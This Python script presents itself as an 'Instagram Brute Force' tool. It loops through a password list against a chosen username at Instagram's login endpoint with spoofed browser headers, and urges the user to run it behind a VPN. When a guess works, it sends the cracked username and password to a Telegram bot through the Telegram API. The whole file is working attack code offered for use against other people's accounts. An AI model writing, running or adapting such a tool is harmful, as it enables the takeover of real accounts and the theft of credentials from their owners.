#Telegram : U33UP
#Insta: e4cb
from colorama import Fore
import time
import string
import random
import requests
import os
import sys as n
import time as mm

session = requests.session()
red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
cyan = Fore.CYAN
yelo = Fore.YELLOW


print(green+'''

    _____          _                                  
   |_   _|        | |                                 
     | | _ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___  
     | || '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \ 
    _| || | | \__ \ || (_| | (_| | | | (_| | | | | | |
    \___/_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_|
                             __/ |                    
                            |___/                     

                                        
            Instagram Brute Force
            
            Author --> #UNIX
            Telegram --> U33UP
            Telegram Channel --> B_G_Y / E4CBM
            Instagram --> E4CB
            Github --> 8LR

    Do not forget to turn on the vpn ! 
Create a file & named pass.txt and put passwords in it

''')

user = input(cyan+f'[+] >> Enter username :{red} ')
print(yelo+'___________________________________')
time.sleep(1)
id = input(cyan+f'[+] >> Enter you id :{red}')
print(yelo+'___________________________________')
time.sleep(1)
token = input(cyan+f'[+] >> Enter you token bot :{red} ')
print(yelo+'___________________________________')
print("The tool is running...")
pess = 'pass.txt'
file = open(pess, 'r')


def insta():
  while True:
    pess = file.readline().split('\n')[0]
    url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'

    headers = {
      'accept': '*/*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,tr-TR;q=0.6,tr;q=0.5,ckb;q=0.4',
      'content-length': '467',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.instagram.com',
      'referer': 'https://www.instagram.com/',
      'sec-ch-prefers-color-scheme': 'dark',
      'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
      'viewport-width': '574',
      'x-asbd-id': '198387',
      'x-csrftoken': 'eWSBXB4PFl0LR95ZKOgeHwhEvVI4SW9h',
      'x-ig-app-id': '936619743392459',
      'x-ig-www-claim': '0',
      'x-instagram-ajax': '1006638469',
      'x-requested-with': 'XMLHttpRequest'}
  
    tme = str(time.time()).split('.')[1]
    data = {
	    'username': f'{user}',
      'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tme}:{pess}',
      'queryParams': {},
      'optIntoOneTap': 'false'}
  
    req = session.post(url,headers=headers,data=data)

    response = req.text

    if ('"status":fail') in response:
      print(red+"Error While cheking")
      print(red+"Stop The Tool And Try Another VPN ")
      input(cyan+"Press Enter to exit......")
      exit()

    elif ('"authenticated":true') in response:
      print(yelo+'================================')
      print(green+f'[+] >> Hacked user: {user} pass: {pess} ..')
      Telegram =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Instagram Hacked By UNIX \nuser:{user}\npass:{pess}\n————————-\nTELE: @U33UP\nChannel: @B_G_Y / @E4CBM ')
      req = requests.post(Telegram)
      print(green+"Done send user & password to your telegram")
      input(cyan+"Press Enter to exit......")
      exit()
      
    elif '"chekpoint_url"' in response:
      print(yelo+'================================')
      print(yelo+f"[!] Secure user: {user} pass: {pess}..! ")
      Telegram =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Secure Instagram  By UNIX \nuser:{user}\npass:{pess}\n————————-\nTELE: @U33UP\nChannel: @B_G_Y / @E4CBM ')
      req = requests.post(Telegram)
      input("Press Enter to exit......")
      exit()
    
    else:
      print(yelo+'================================')
      print(red+f'[-]>> Not Hacked user: {user} pass: {pess} ..')
    time.sleep(3)
      

req = requests.session()
insta()
